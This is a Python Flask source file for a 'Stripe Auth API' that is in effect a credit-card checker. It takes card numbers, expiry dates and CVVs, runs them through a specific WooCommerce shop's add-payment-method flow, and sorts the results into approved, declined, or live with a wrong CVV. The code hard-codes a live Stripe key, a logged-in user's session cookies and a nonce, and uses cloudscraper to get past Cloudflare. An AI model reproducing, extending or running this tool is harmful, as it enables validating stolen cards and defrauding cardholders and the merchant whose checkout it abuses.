from flask import Flask, request, jsonify
import cloudscraper
import requests

app = Flask(__name__)

# Stripe Public Key
STRIPE_PK = 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'

# WooCommerce Cookies & Nonce
COOKIES = {
    '__cf_bm': 'A9UWMH0qRFN40o1eIDefAIgZHEzlvcPXAonf57iCWMw-1768290583-1.0.1.1-MsHIAV3.sf8ySh.QyKfOGm41IUWhcbMere8W0Jre4LOgJtJUd6K3OK3dU6rV.id9bcf3EjPRbD5icjitxP_vUzASMtFvRZx8OYKkSBdlTng',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2026-01-13%2007%3A19%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2026-01-13%2007%3A19%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222026-01-13%2007%3A19%3A47%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'theodorefost.e.r.6.4.12.1%7C1769500252%7CpT401Of9wpavBCoW9OY8pP4aK8WUaa6u9utnr147pOj%7C70ba66907e2a01e0b095f6e2cd6e7e8951127a20f8604cb254fdb63053fd1555',
    'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'theodorefost.e.r.6.4.12.1%7C1769500252%7CpT401Of9wpavBCoW9OY8pP4aK8WUaa6u9utnr147pOj%7Cbc08ed862cca83db2738a761c50d1dcc55204a597aa4f29f319a5e5a8e8b1a93',
    '__stripe_mid': '6003ffd6-a318-4862-a0ef-412b792379409c9ecb',
    '__stripe_sid': '3e4f469e-9317-483b-ac9f-8b9107c2c1a83d2d17',
    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F',
}

AJAX_NONCE = 'dc69c7cb82'

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'Stripe Auth API',
        'endpoints': {
            'check': '/api/check (POST)',
            'health': '/ (GET)'
        }
    })

@app.route('/api/check', methods=['POST'])
def check_card():
    try:
        data = request.json
        card = data.get('card', '').strip()
        month = data.get('month', '').strip()
        year = data.get('year', '').strip()
        cvv = data.get('cvv', '').strip()
        
        # Fix year
        if len(year) == 4:
            year = year[2:]
        
        # Step 1: Create Stripe Payment Method
        headers_stripe = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        stripe_payload = (
            f'type=card'
            f'&card[number]={card}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={year}'
            f'&card[exp_month]={month.zfill(2)}'
            f'&allow_redisplay=unspecified'
            f'&billing_details[address][postal_code]=10080'
            f'&billing_details[address][country]=US'
            f'&payment_user_agent=stripe.js%2Fe188bca55b%3B+stripe-js-v3%2Fe188bca55b%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fshop.wiseacrebrew.com'
            f'&key={STRIPE_PK}'
            f'&_stripe_version=2024-06-20'
        )
        
        response_stripe = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers_stripe,
            data=stripe_payload,
            timeout=30
        )
        
        if response_stripe.status_code != 200:
            error_msg = response_stripe.json().get('error', {}).get('message', 'Invalid card')
            return jsonify({
                'status': 'declined',
                'message': f'Card Invalid - {error_msg}',
                'code': 'invalid_card'
            })
        
        payment_method_id = response_stripe.json()["id"]
        
        # Step 2: Authorize with Cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        headers_auth = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_auth = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': AJAX_NONCE,
        }
        
        response_auth = scraper.post(
            'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php',
            cookies=COOKIES,
            headers=headers_auth,
            data=data_auth,
            timeout=60
        )
        
        result_text = response_auth.text.lower()
        
        # Response detection
        if 'success' in result_text and 'true' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Authorized Successfully',
                'code': 'approved'
            })
        elif 'decline' in result_text or 'declined' in result_text:
            return jsonify({
                'status': 'declined',
                'message': 'Card Declined',
                'code': 'card_declined'
            })
        elif 'cvc' in result_text or 'security code' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Live - CVV Incorrect',
                'code': 'incorrect_cvc'
            })
        elif 'expired' in result_text:
            return jsonify({
                'status': 'declined',
                'message': 'Card Expired',
                'code': 'expired_card'
            })
        else:
            return jsonify({
                'status': 'unknown',
                'message': 'Unknown Response',
                'code': 'unknown'
            })
            
    except requests.exceptions.Timeout:
        return jsonify({
            'status': 'error',
            'message': 'Request Timeout',
            'code': 'timeout'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error: {str(e)}',
            'code': 'exception'
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
